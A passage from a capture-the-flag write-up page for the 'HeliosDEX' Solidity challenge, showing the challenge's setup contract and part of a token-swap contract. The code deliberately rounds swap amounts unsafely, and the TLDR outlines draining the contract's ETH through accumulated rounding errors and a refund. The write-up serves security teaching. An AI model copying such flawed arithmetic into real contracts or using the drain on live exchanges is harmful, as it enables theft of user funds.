text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="py-2 border-dotted border-neutral-300 border-s-1 -ms-5 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#tldr>TLDR</a></li><li><a href=#description>Description</a></li><li><a href=#skills-required>Skills Required</a></li><li><a href=#skills-learned>Skills Learned</a></li><li><a href=#challenge-scenario>Challenge Scenario</a></li><li><a href=#analyzing-the-source-code>Analyzing the Source Code</a><ul><li><a href=#setupsol><code>Setup.sol</code></a></li><li><a href=#heliosdexsol><code>HeliosDEX.sol</code></a></li></ul></li><li><a href=#exploitation>Exploitation</a></li></ul></nav></div></details><script>(function(){"use strict";const s=.33,o="#TableOfContents",i=".anchor",a='a[href^="#"]',r="li ul",c="active";let t=!1;function l(e,n){const o=window.scrollY+window.innerHeight*n,i=[...document.querySelectorAll('#TableOfContents a[href^="#"]')],s=new Set(i.map(e=>e.getAttribute("href").substring(1)));if(t)for(let t=0;t<e.length;t++){const n=e[t];if(!s.has(n.id))continue;const o=n.getBoundingClientRect().top+window.scrollY;if(Math.abs(window.scrollY-o)<100)return n.id}for(let t=e.length-1;t>=0;t--){const n=e[t].getBoundingClientRect().top+window.scrollY;if(n<=o&&s.has(e[t].id))return e[t].id}return e.find(e=>s.has(e.id))?.id||""}function e({toc:e,anchors:t,links:n,scrollOffset:s,collapseInactive:o}){const i=l(t,s);if(!i)return;if(n.forEach(e=>{const t=e.getAttribute("href")===`#${i}`;if(e.classList.toggle(c,t),o){const n=e.closest("li")?.querySelector("ul");n&&(n.style.display=t?"":"none")}}),o){const n=e.querySelector(`a[href="#${CSS.escape(i)}"]`);let t=n;for(;t&&t!==e;)t.tagName==="UL"&&(t.style.display=""),t.tagName==="LI"&&t.querySelector("ul")?.style.setProperty("display",""),t=t.parentElement}}function n(){const n=document.querySelector(o);if(!n)return;const l=!1,u=[...document.querySelectorAll(i)],d=[...n.querySelectorAll(a)];l&&n.querySelectorAll(r).forEach(e=>e.style.display="none"),d.forEach(e=>{e.addEventListener("click",()=>{t=!0})});const c={toc:n,anchors:u,links:d,scrollOffset:s,collapseInactive:l};window.addEventListener("scroll",()=>e(c),{passive:!0}),window.addEventListener("hashchange",()=>e(c),{passive:!0}),e(c)}document.readyState==="loading"?document.addEventListener("DOMContentLoaded",n):n()})()</script></div></div><div class="min-w-0 min-h-0 max-w-fit"><div class="article-content max-w-prose mb-20"><h1 class="relative group">HeliosDEX<div id=heliosdex class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#heliosdex aria-label=Anchor>#</a></span></h1><p>15<sup>th</sup> Mar 2025<br>Prepared By: perrythepwner<br>Challenge Author(s): <strong>perrythepwner</strong><br>Difficulty: <font color=green>Easy</font></p><a id=github-resource-c781610cfbfa8d670a40fcdd507ae90c target=_blank href=https://github.com/simonedimaria/my-ctf-challenges/tree/main/HTB-CyberApocalypse-2025/HeliosDEX class=cursor-pointer><div class="w-full md:w-auto pt-3 p-5 border border-neutral-200 dark:border-neutral-700 border rounded-md shadow-2xl"><div class="flex items-center"><span class="text-2xl text-neutral-800 dark:text-neutral" style=margin-right:10px><span class="relative block icon"><svg viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6.0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6.0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3.0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1.0-6.2-.3-40.4-.3-61.4.0.0-70 15-84.7-29.8.0.0-11.4-29.1-27.8-36.6.0.0-22.9-15.7 1.6-15.4.0.0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5.0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9.0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4.0 33.7-.3 75.4-.3 83.6.0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6.0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9.0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg></span></span><div id=github-resource-c781610cfbfa8d670a40fcdd507ae90c-full_name class="m-0 font-bold text-xl text-neutral-800 decoration-primary-500 hover:underline hover:underline-offset-2 dark:text-neutral">simonedimaria/my-ctf-challenges</div></div><p id=github-resource-c781610cfbfa8d670a40fcdd507ae90c-description class="m-0 mt-2 text-md text-neutral-800 dark:text-neutral">My authored CTF challenges sources and official writeups</p><div class="m-0 mt-2 flex items-center"><span class="mr-1 inline-block h-3 w-3 rounded-full" style=background-color:#0077b6></span><div class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">Solidity</div><span class="text-md mr-1 text-neutral-800 dark:text-neutral"><span class="relative block icon"><svg viewBox="0 0 576 512"><path fill="currentColor" d="M287.9.0C297.1.0 305.5 5.25 309.5 13.52L378.1 154.8l153.3 22.7C540.4 178.8 547.8 185.1 550.7 193.7 553.5 202.4 551.2 211.9 544.8 218.2L433.6 328.4l26.3 155.5C461.4 492.9 457.7 502.1 450.2 507.4 442.8 512.7 432.1 513.4 424.9 509.1L287.9 435.9 150.1 509.1C142.9 513.4 133.1 512.7 125.6 507.4 118.2 502.1 114.5 492.9 115.1 483.9l27.1-155.5L31.11 218.2C24.65 211.9 22.36 202.4 25.2 193.7 28.03 185.1 35.5 178.8 44.49 177.5L197.7 154.8 266.3 13.52C270.4 5.249 278.7.0 287.9.0zm0 78.95L235.4 187.2C231.9 194.3 225.1 199.3 217.3 200.5L98.98 217.9 184.9 303C190.4 308.5 192.9 316.4 191.6 324.1L171.4 443.7l105.2-56.2C283.7 383.7 292.2 383.7 299.2 387.5l105.2 56.2-20.2-119.6C382.9 316.4 385.5 308.5 391 303l85.9-85.1-118.3-17.4C350.7 199.3 343.9 194.3 340.5 187.2L287.9 78.95z"/></svg></span></span><div id=github-resource-c781610cfbfa8d670a40fcdd507ae90c-stargazers class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">0</div><span class="text-md mr-1 text-neutral-800 dark:text-neutral"><span class="relative block icon"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M80 104c13.3.0 24-10.7 24-24S93.3 56 80 56 56 66.7 56 80s10.7 24 24 24zm80-24c0 32.8-19.7 61-48 73.3V192c0 17.7 14.3 32 32 32H304c17.7.0 32-14.3 32-32V153.3C307.7 141 288 112.8 288 80c0-44.2 35.8-80 80-80s80 35.8 80 80c0 32.8-19.7 61-48 73.3V192c0 53-43 96-96 96H256v70.7c28.3 12.3 48 40.5 48 73.3.0 44.2-35.8 80-80 80s-80-35.8-80-80c0-32.8 19.7-61 48-73.3V288H144c-53 0-96-43-96-96V153.3C19.7 141 0 112.8.0 80 0 35.8 35.8.0 80 0s80 35.8 80 80zm208 24c13.3.0 24-10.7 24-24s-10.7-24-24-24-24 10.7-24 24 10.7 24 24 24zM248 432c0-13.3-10.7-24-24-24s-24 10.7-24 24 10.7 24 24 24 24-10.7 24-24z"/></svg></span></span><div id=github-resource-c781610cfbfa8d670a40fcdd507ae90c-forks class="m-0 mr-5 text-md text-neutral-800 dark:text-neutral">0</div><code class="px-2 py-1 rounded bg-neutral-200 text-neutral-800 dark:bg-neutral-800 dark:text-neutral-100 text-sm">/tree/main/HTB-CyberApocalypse-2025/HeliosDEX</code></div></div><script>fetch("https://api.github.com/repos/simonedimaria/my-ctf-challenges",{headers:new Headers({"User-agent":"Mozilla/4.0 Custom User Agent"})}).then(e=>e.json()).then(e=>{e.full_name&&(document.getElementById("github-resource-c781610cfbfa8d670a40fcdd507ae90c-full_name").innerHTML=e.full_name),e.description&&(document.getElementById("github-resource-c781610cfbfa8d670a40fcdd507ae90c-description").innerHTML=e.description),e.stargazers_count!==0[0]&&(document.getElementById("github-resource-c781610cfbfa8d670a40fcdd507ae90c-stargazers").innerHTML=e.stargazers_count),e.forks!==0[0]&&(document.getElementById("github-resource-c781610cfbfa8d670a40fcdd507ae90c-forks").innerHTML=e.forks)}).catch(e=>console.error(e))</script></a><hr><h2 class="relative group">TLDR<div id=tldr class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#tldr aria-label=Anchor>#</a></span></h2><p>This DEFI challenge consists in exploiting a DEX that uses unsafe arithmetic operations from the <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol target=_blank>OZ <code>Math.sol</code> library</a>. The goal is to repeat trades to accumulate rounding errors and eventually drain the contract&rsquo;s balance with a one shot refund trade.</p><h2 class="relative group">Description<div id=description class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#description aria-label=Anchor>#</a></span></h2><blockquote><p>You stand victorious, panting, over the fallen form of Eldorion. The beast&rsquo;s eternal resilience proved no match for your cunning and skill, adventurer. The path to the city gates of Eldoria now lies open, but the journey is far from over. As you approach, a shimmering structure catches your eye: the HeliosDEX, a decentralized exchange powered by the radiant energy of Helios himself. Whispers tell of travelers using this exchange to amass fortunes, stocking up on rare items and crucial supplies before braving the perils of Eldoria. Perhaps you can use this opportunity to your advantage&mldr;</p></blockquote><h2 class="relative group">Skills Required<div id=skills-required class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#skills-required aria-label=Anchor>#</a></span></h2><ul><li>Basic understanding of Solidity and ERC20 token standards.</li><li>Familiarity with arithmetic operations and rounding behavior in Solidity (via functions like <code>Math.mulDiv</code>).</li><li>Exploiting vulnerabilities in token swap and refund mechanisms.</li></ul><h2 class="relative group">Skills Learned<div id=skills-learned class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#skills-learned aria-label=Anchor>#</a></span></h2><ul><li>Recognizing how different rounding modes (Floor, Ceil, Trunc, Expand) in the <a href=https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/Math.sol target=_blank>OZ <code>Math.sol</code> library</a>affect swap calculations.</li></ul><h2 class="relative group">Challenge Scenario<div id=challenge-scenario class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#challenge-scenario aria-label=Anchor>#</a></span></h2><p>We&rsquo;re given two contracts: A classic <code>Setup.sol</code> contract and a <code>HeliosDEX.sol</code> contract. As the name suggests, it&rsquo;s a decentralized exchange that allows users to swap between three different tokens: EldorionFang (ELD), MalakarEssence (MAL), and HeliosLuminaShards (HLS).</p><h2 class="relative group">Analyzing the Source Code<div id=analyzing-the-source-code class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#analyzing-the-source-code aria-label=Anchor>#</a></span></h2><h3 class="relative group"><code>Setup.sol</code><div id=setupsol class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#setupsol aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>28</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=p>{</span> <span class=n>HeliosDEX</span> <span class=p>}</span> <span class=k>from</span> <span class=s>&#34;./HeliosDEX.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>Setup</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>HeliosDEX</span> <span class=k>public</span> <span class=n>TARGET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>address</span> <span class=k>public</span> <span class=n>player</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>DeployedTarget</span><span class=p>(</span><span class=kt>address</span> <span class=n>at</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>address</span> <span class=n>_player</span><span class=p>)</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>TARGET</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HeliosDEX</span><span class=p>{</span><span class=nb>value</span><span class=o>:</span> <span class=mi>1000</span> <span class=kc>ether</span><span class=p>}(</span><span class=mi>1000</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>player</span> <span class=o>=</span> <span class=n>_player</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>DeployedTarget</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>TARGET</span><span class=p>));</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>isSolved</span><span class=p>()</span> <span class=k>public</span> <span class=k>view</span> <span class=k>returns</span> <span class=p>(</span><span class=kt>bool</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>player</span><span class=p>.</span><span class=nb>balance</span> <span class=o>&gt;=</span> <span class=mi>20</span> <span class=kc>ether</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>The challenge is deployed using the <code>Setup.sol</code> contract. It creates an instance of <code>HeliosDEX</code> with an <strong>initial token supply (1000 units for each token) and funds the DEX with 1000 ETH</strong>. Your address is registered as the player. The challenge is solved when your player&rsquo;s balance reaches at least 20 ETH (which is almost double of the initial balance).</p><h3 class="relative group"><code>HeliosDEX.sol</code><div id=heliosdexsol class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none"><a class="text-primary-300 dark:text-neutral-700 !no-underline" href=#heliosdexsol aria-label=Anchor>#</a></span></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-solidity data-lang=solidity><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: MIT
</span></span></span><span class=line><span class=cl><span class=c1></span>
</span></span><span class=line><span class=cl><span class=k>pragma solidity</span> <span class=o>^</span><span class=mi>0</span><span class=p>.</span><span class=mi>8</span><span class=p>.</span><span class=mi>28</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>/***
</span></span></span><span class=line><span class=cl><span class=cm>    __  __     ___            ____  _______  __
</span></span></span><span class=line><span class=cl><span class=cm>   / / / /__  / (_)___  _____/ __ \/ ____/ |/ /
</span></span></span><span class=line><span class=cl><span class=cm>  / /_/ / _ \/ / / __ \/ ___/ / / / __/  |   / 
</span></span></span><span class=line><span class=cl><span class=cm> / __  /  __/ / / /_/ (__  ) /_/ / /___ /   |  
</span></span></span><span class=line><span class=cl><span class=cm>/_/ /_/\___/_/_/\____/____/_____/_____//_/|_|  
</span></span></span><span class=line><span class=cl><span class=cm>                                               
</span></span></span><span class=line><span class=cl><span class=cm>    Today&#39;s item listing:
</span></span></span><span class=line><span class=cl><span class=cm>    * Eldorion Fang (ELD): A shard of a Eldorion&#39;s fang, said to imbue the holder with courage and the strength of the ancient beast. A symbol of valor in battle.
</span></span></span><span class=line><span class=cl><span class=cm>    * Malakar Essence (MAL): A dark, viscous substance, pulsing with the corrupted power of Malakar. Use with extreme caution, as it whispers promises of forbidden strength. MAY CAUSE HALLUCINATIONS.
</span></span></span><span class=line><span class=cl><span class=cm>    * Helios Lumina Shards (HLS): Fragments of pure, solidified light, radiating the warmth and energy of Helios. These shards are key to powering Eldoria&#39;s invisible eye.
</span></span></span><span class=line><span class=cl><span class=cm>***/</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;@openzeppelin/contracts/token/ERC20/ERC20.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;@openzeppelin/contracts/utils/math/Math.sol&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>EldorionFang</span> <span class=k>is</span> <span class=n>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>initialSupply</span><span class=p>)</span> <span class=n>ERC20</span><span class=p>(</span><span class=s>&#34;EldorionFang&#34;</span><span class=p>,</span> <span class=s>&#34;ELD&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>initialSupply</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>MalakarEssence</span> <span class=k>is</span> <span class=n>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>initialSupply</span><span class=p>)</span> <span class=n>ERC20</span><span class=p>(</span><span class=s>&#34;MalakarEssence&#34;</span><span class=p>,</span> <span class=s>&#34;MAL&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>initialSupply</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>HeliosLuminaShards</span> <span class=k>is</span> <span class=n>ERC20</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>initialSupply</span><span class=p>)</span> <span class=n>ERC20</span><span class=p>(</span><span class=s>&#34;HeliosLuminaShards&#34;</span><span class=p>,</span> <span class=s>&#34;HLS&#34;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>_mint</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>initialSupply</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>contract</span> <span class=nc>HeliosDEX</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>EldorionFang</span> <span class=k>public</span> <span class=n>eldorionFang</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>MalakarEssence</span> <span class=k>public</span> <span class=n>malakarEssence</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>HeliosLuminaShards</span> <span class=k>public</span> <span class=n>heliosLuminaShards</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>reserveELD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>reserveMAL</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=n>reserveHLS</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>exchangeRatioELD</span> <span class=o>=</span> <span class=mi>2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>exchangeRatioMAL</span> <span class=o>=</span> <span class=mi>4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>exchangeRatioHLS</span> <span class=o>=</span> <span class=mi>10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>uint256</span> <span class=k>public</span> <span class=k>immutable</span> <span class=n>feeBps</span> <span class=o>=</span> <span class=mi>25</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>mapping</span><span class=p>(</span><span class=kt>address</span> <span class=o>=&gt;</span> <span class=kt>bool</span><span class=p>)</span> <span class=k>public</span> <span class=n>hasRefunded</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>bool</span> <span class=k>public</span> <span class=n>_tradeLock</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>HeliosBarter</span><span class=p>(</span><span class=kt>address</span> <span class=n>item</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>inAmount</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>outAmount</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=kd>event</span> <span class=nc>HeliosRefund</span><span class=p>(</span><span class=kt>address</span> <span class=n>item</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>inAmount</span><span class=p>,</span> <span class=kt>uint256</span> <span class=n>ethOut</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>constructor</span><span class=p>(</span><span class=kt>uint256</span> <span class=n>initialSupplies</span><span class=p>)</span> <span class=k>payable</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>eldorionFang</span> <span class=o>=</span> <span class=k>new</span> <span class=n>EldorionFang</span><span class=p>(</span><span class=n>initialSupplies</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>malakarEssence</span> <span class=o>=</span> <span class=k>new</span> <span class=n>MalakarEssence</span><span class=p>(</span><span class=n>initialSupplies</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>heliosLuminaShards</span> <span class=o>=</span> <span class=k>new</span> <span class=n>HeliosLuminaShards</span><span class=p>(</span><span class=n>initialSupplies</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>reserveELD</span> <span class=o>=</span> <span class=n>initialSupplies</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>reserveMAL</span> <span class=o>=</span> <span class=n>initialSupplies</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>reserveHLS</span> <span class=o>=</span> <span class=n>initialSupplies</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>modifier</span> <span class=nf>underHeliosEye</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: Helios sees your empty hand! Only true offerings are worthy of a HeliosBarter&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>modifier</span> <span class=nf>heliosGuardedTrade</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>_tradeLock</span> <span class=o>!=</span> <span class=kc>true</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: Helios shields this trade! Another transaction is already underway. Patience, traveler&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=n>_tradeLock</span> <span class=o>=</span> <span class=kc>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>_</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>_tradeLock</span> <span class=o>=</span> <span class=kc>false</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>swapForELD</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>underHeliosEye</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>grossELD</span> <span class=o>=</span> <span class=n>Math</span><span class=p>.</span><span class=n>mulDiv</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>exchangeRatioELD</span><span class=p>,</span> <span class=mi>1</span><span class=n>e18</span><span class=p>,</span> <span class=n>Math</span><span class=p>.</span><span class=n>Rounding</span><span class=p>(</span><span class=mi>0</span><span class=p>));</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>fee</span> <span class=o>=</span> <span class=p>(</span><span class=n>grossELD</span> <span class=o>*</span> <span class=n>feeBps</span><span class=p>)</span> <span class=o>/</span> <span class=mi>10</span><span class=n>_000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=kt>uint256</span> <span class=n>netELD</span> <span class=o>=</span> <span class=n>grossELD</span> <span class=o>-</span> <span class=n>fee</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>require</span><span class=p>(</span><span class=n>netELD</span> <span class=o>&lt;=</span> <span class=n>reserveELD</span><span class=p>,</span> <span class=s>&#34;HeliosDEX: Helios grieves that the ELD reserves are not plentiful enough for this exchange. A smaller offering would be most welcome&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>reserveELD</span> <span class=o>-=</span> <span class=n>netELD</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>eldorionFang</span><span class=p>.</span><span class=nb>transfer</span><span class=p>(</span><span class=nb>msg</span><span class=p>.</span><span class=nb>sender</span><span class=p>,</span> <span class=n>netELD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>emit</span> <span class=n>HeliosBarter</span><span class=p>(</span><span class=kt>address</span><span class=p>(</span><span class=n>eldorionFang</span><span class=p>),</span> <span class=nb>msg</span><span class=p>.</span><span class=nb>value</span><span class=p>,</span> <span class=n>netELD</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kd>function</span> <span class=nf>swapForMAL</span><span class=p>()</span> <span class=k>external</span> <span class=k>payable</span> <span class=n>underHeliosEye</span> <span class=p>{</span>
